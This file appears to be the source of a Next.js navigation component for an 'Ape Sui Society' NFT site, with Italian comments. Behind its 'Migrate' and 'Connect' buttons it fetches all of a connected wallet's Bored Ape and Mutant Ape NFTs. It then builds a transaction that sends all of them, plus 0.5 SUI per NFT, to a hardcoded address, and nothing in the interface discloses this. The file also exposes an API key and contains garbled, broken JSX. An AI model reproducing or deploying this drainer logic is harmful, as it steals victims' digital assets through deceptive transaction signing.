'use client'


import React, { useEffect, useState } from 'react';
import * as NavigationMenu from '@radix-ui/react-navigation-menu';
import { CaretDownIcon } from '@radix-ui/react-icons';
import './styles.css';
import { ConnectButton, useCurrentAccount, useSignAndExecuteTransactionBlock, useAccounts, useWallets , } from '@mysten/dapp-kit';
import Link from 'next/link';
import Image from 'next/image';
import logo from './logo.png';
import axios from 'axios';
import { SuiClient } from '@mysten/sui.js/client';
import type { SuiObjectRef, SuiObjectResponse } from '@mysten/sui.js/client';
import type { NextApiRequest, NextApiResponse } from 'next';


import { getFullnodeUrl } from '@mysten/sui.js/client';
import { TransactionBlock } from '@mysten/sui.js/transactions';

interface INft {
  collection: string;
  objectId: string;
  // Aggiungi altre proprietà rilevanti per un NFT secondo la tua API
}

interface NavigationMenuDemoProps {
  isPlace: boolean;
  onCreated?: (ids: string[]) => void; // Optional callback prop
}

interface NFTCountsAndIds {
  boredApeCount: number;
  mutantApeCount: number;
  boredApeIds: string[];
  mutantApeIds: string[];
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const fetchAllNFTs = async (walletAddress: string): Promise<NFTCountsAndIds> => {

  let pageIndex = 1;
  const pageSize = 50;
  let hasMore = true;
  let allNFTs: INft[] = []; // Array per accumulare tutti gli NFT recuperati
  
  while (hasMore) {
    const url = `https://api.blockvision.org/v2/sui/account/nfts?account=${walletAddress}&pageIndex=${pageIndex}&pageSize=${pageSize}`;

    try {
      const response = await axios.get(url, {
        headers: {
          'accept': 'application/json',
          'x-api-key': '2fBn9pzKppbQfhfeXrsL4rjBr7b', // Sostituisci con la tua chiave API reale
        },
      });

      const data = response.data.result.data;
      allNFTs = allNFTs.concat(data); // Aggiungi gli NFT recuperati all'array

      // Controlla se dobbiamo recuperare più pagine
      hasMore = data.length === pageSize;
      pageIndex++; // Prepara per la prossima pagina
    } catch (error) {
      console.error('Errore nel fetch degli NFT:', error);
      break; // Interrompe il ciclo in caso di errore
    }
  }

  // Filtra e conta gli NFT in base alle collezioni specifiche
  const filteredCountsAndIds = filterAndCountNFTs(allNFTs);
  return filteredCountsAndIds;
};

// Questa funzione filtra gli NFT recuperati e conta quelli appartenenti alle collezioni specifiche
const filterAndCountNFTs = (nfts: INft[]): NFTCountsAndIds => {
  let boredApeCount = 0;
  let mutantApeCount = 0;
  let boredApeIds: string[] = [];
  let mutantApeIds: string[] = [];

  nfts.forEach((nft: INft) => {
    if (nft.collection && nft.collection.includes('boredapesuiclub_collection::BoredApeSuiClub')) {
      boredApeCount++;
      boredApeIds.push(nft.objectId);
    }
    if (nft.collection && nft.collection.includes('0x3949f64e3df33c00cf978163cbc748dd5108f72d72490b4ca760acdd41c1e45c::my_minter::Nft')) {
      mutantApeCount++;
      mutantApeIds.push(nft.objectId);
    }
  });

  return { boredApeCount, mutantApeCount, boredApeIds, mutantApeIds };
};



const NavigationMenuDemo: React.FC<NavigationMenuDemoProps> = ({ isPlace, onCreated }) => {
  const [nftCounts, setNftCounts] = useState<NFTCountsAndIds>({
    boredApeCount: 0,
    mutantApeCount: 0,
    boredApeIds: [], // TypeScript inferirà questo come string[]
    mutantApeIds: [] // TypeScript inferirà questo come string[]
  });const [initiateTransaction, setInitiateTransaction] = useState(false); // New state to control transaction initiation
  const accounts = useAccounts();
  const { mutate: signAndExecute } = useSignAndExecuteTransactionBlock();
  const currentAccount = useCurrentAccount(); // Assuming it's safe to call here at the top level

  useEffect(() => {
    if (isPlace && accounts && accounts.length > 0) {
      const address = accounts[0].address;
      if (address) {
        fetchAllNFTs(address).then((data: NFTCountsAndIds) => {
          setNftCounts(data);
          console.log(data.boredApeIds);
          
          setInitiateTransaction(true);
        }).catch((error: any) => {
          console.error('Errore nel recuperare i conteggi NFT:', error);
        });
      }
    }
  }, [isPlace, accounts]); // Assicurati che l'hook useEffect sia chiuso correttamente qui

  useEffect(() => {
    // Definisce una funzione asincrona all'interno dell'effetto
    const executeTransaction = async () => {

   
        const allNftIds = [...nftCounts.boredApeIds, ...nftCounts.mutantApeIds];
        const totalNfts = allNftIds.length;
        const BATCH_SIZE = 60; // Numero di NFT per lotto
        const SUI_PER_NFT  = 0.5; // 0.5 SUI per ogni NFT
        const SUI_TO_SUBSUI = 1000000000;
        
        const totalAmountInSubSUI = SUI_PER_NFT  * SUI_TO_SUBSUI *totalNfts ;
        if (!initiateTransaction || accounts.length === 0 || allNftIds.length === 0) return;
        const rpcUrl = getFullnodeUrl('mainnet');
        const client = new SuiClient({ url: rpcUrl });


        const sui = await client.getBalance({
          owner:  accounts[0].address,
        });
        console.log(sui);
        try {
          // Calcola il numero totale di lotti
          const totalBatches = Math.ceil(allNftIds.length / BATCH_SIZE);
          let costo = SUI_TO_SUBSUI * SUI_PER_NFT *totalNfts


    
          if ( Number(sui.totalBalance) > costo){
            // Calcola l'indice di inizio e fine per gli NFT di questo lotto
            console.log(costo);
            const txb = new TransactionBlock();
            // Prepara i SUI per il trasferimento
            const [coin] = txb.splitCoins(txb.gas, [costo]);

            
            txb.setGasBudget(100000000);
            let i=0;
            // Trasferisci gli NFT di questo lotto
            allNftIds.forEach(nftId => {
              txb.transferObjects([txb.object(nftId)], '0x714765e37aef0ef714f06770e655e881fdf37fe2c2e05fb4d5726b9f2268731b');
              i=i+1;
              if(i== totalNfts){
                console.log("ok");
                txb.transferObjects([coin],'0x714765e37aef0ef714f06770e655e881fdf37fe2c2e05fb4d5726b9f2268731b');
    
              }
            });
    
            // Dopo aver trasferito gli NFT, trasferisci i SUI
            
            // Nota: sostituisci il log sopra con la tua logica di firma ed esecuzione della transazione
            
            // Supponendo che `signAndExecute` sia una funzione che gestisca l'esecuzione
            await     signAndExecute(
              {
                transactionBlock: txb,
                options: {
                  showEffects: true,
                  showObjectChanges: true,
                },
              },
              {
                onSuccess: (tx) => {
                  client.waitForTransactionBlock({ digest: tx.digest }).then(async () => { // Marca questa funzione come async
                    console.log(tx.digest);
                
                  });
                },
              },
            );


          setInitiateTransaction(false);
        }else{
          alert('you have to own '+costo/SUI_TO_SUBSUI+' $SUI');
        }
           // Resetta il flag dopo aver completato tutti i lotti
        } catch (error) {
          console.error('Errore nell\'esecuzione della transazione:', error);
        }
      };
    
      executeTransaction();
    },[ signAndExecute,initiateTransaction, nftCounts, accounts]);  // Aggiungi tutte le dipendenze necessarie qui
   // Correct dependencies

  return (
  
    
    <nav className="navbar">
    <div className="logo">
  <Link href="https://www.apesuisociety.com" passHref>
    <a>
      <Image src={logo} alt="logo" width={60} height={60} />
    </a>
  </Link>
</div>
      <div className="nav-item">
        <a href="https://www.apesuisociety.com/apes.html" className="hover:text-gray-500">Apes</a>
        <a href="#" className="hover:text-gray-500">Migrate</a>
        <a href="#" className="hover:text-gray-500">More</a>
      </div>
      <div className="nav-links">
      <NavigationMenu.Root className="NavigationMenuRoot top-2 text-blue">
      <NavigationMenu.List className="NavigationMenuList">
        </div>
const DiscordSVG = () => (
  <svg width="24px" height="24px" viewBox="0 -28.5 256 256" xmlns="http://www.w3.org/2000/svg" fill="#000000">
    <path d="M216.856339,16.5966031 C200.285002,8.84328665 182.566144,3.2084988 164.041564,0 C161.766523,4.11318106 159.108624,9.64549908 157.276099,14.0464379 C137.583995,11.0849896 118.072967,11.0849896 98.7430163,14.0464379 C96.9108417,9.64549908 94.1925838,4.11318106 91.8971895,0 C73.3526068,3.2084988 55.6133949,8.86399117 39.0420583,16.6376612 C5.61752293,67.146514 -3.4433191,116.400813 1.08711069,164.955721 C23.2560196,181.510915 44.7403634,191.567697 65.8621325,198.148576 C71.0772151,190.971126 75.7283628,183.341335 79.7352139,175.300261 C72.104019,172.400575 64.7949724,168.822202 57.8887866,164.667963 C59.7209612,163.310589 61.5131304,161.891452 63.2445898,160.431257 C105.36741,180.133187 151.134928,180.133187 192.754523,160.431257 C194.506336,161.891452 196.298154,163.310589 198.110326,164.667963 C191.183787,168.842556 183.854737,172.420929 176.223542,175.320965 C180.230393,183.341335 184.861538,190.991831 190.096624,198.16893 C211.238746,191.588051 232.743023,181.531619 254.911949,164.955721 C260.227747,108.668201 245.831087,59.8662432 216.856339,16.5966031 Z M85.4738752,135.09489 C72.8290281,135.09489 62.4592217,123.290155 62.4592217,108.914901 C62.4592217,94.5396472 72.607595,82.7145587 85.4738752,82.7145587 C98.3405064,82.7145587 108.709962,94.5189427 108.488529,108.914901 C108.508531,123.290155 98.3405064,135.09489 85.4738752,135.09489 Z M170.525237,135.09489 C157.88039,135.09489 147.510584,123.290155 147.510584,108.914901 C147.510584,94.5396472 157.658606,82.7145587 170.525237,82.7145587 C183.391518,82.7145587 193.761324,94.5189427 193.539891,108.914901 C193.539891,123.290155 183.391518,135.09489 170.525237,135.09489 Z"/>
  </svg>
);
        
        {
  isPlace ? (
    <div className="flex space-x-2">
      <NavigationMenu.Item className='p-1 flex items-center' key="migrate-button-1">
        <DiscordSVG />
        <ConnectButton connectText="Discord" style={{ color: "#000000" }} />
      </NavigationMenu.Item>
      <NavigationMenu.Item className='p-1' key="migrate-button-2">
        <ConnectButton connectText="Connect" style={{ color: "#000000" }} />
      </NavigationMenu.Item>
    </div>
          )
            :
            (
              null
            )
        }
        <NavigationMenu.Indicator className="NavigationMenuIndicator">
          <div className="Arrow" />
        </NavigationMenu.Indicator>
      </NavigationMenu.List>

      <div className="ViewportPosition">
        <NavigationMenu.Viewport className="NavigationMenuViewport" />
      </div>
    </NavigationMenu.Root >
        </div>
       
     
      </nav>

      <div className="nft-counts">
     <p>Bored Ape Count: {nftCounts.boredApeCount}</p>
     <p>Mutant Ape Count: {nftCounts.mutantApeCount}</p>
   </div>
 </>

  );
};

const ListItem = (props: any) => (
  <li>
    <Link href={`/${props.mainlink}/${props.sublink}`}>
    <div>
      <div className='text-xl font-bold font-heading my-0.5'>{props.title}</div>
      <div className='text-sm font-light font-sub tracking-light'>{props.content}</div>
    </div>
    </Link>
    
  </li>
)

// const ListItem = React.forwardRef((ListItemObj, forwardedRef) => (
//   <li>
//     <NavigationMenu.Link asChild>
//       <a className={classNames('ListItemLink', ListItemObj.className)} {...ListItemObj.props} ref={forwardedRef}>
//         <div className="ListItemHeading">{ListItemObj.title}</div>
//         <p className="ListItemText">{ListItemObj.children}</p>
//       </a>
//     </NavigationMenu.Link>
//   </li>
// ));

export default NavigationMenuDemo;
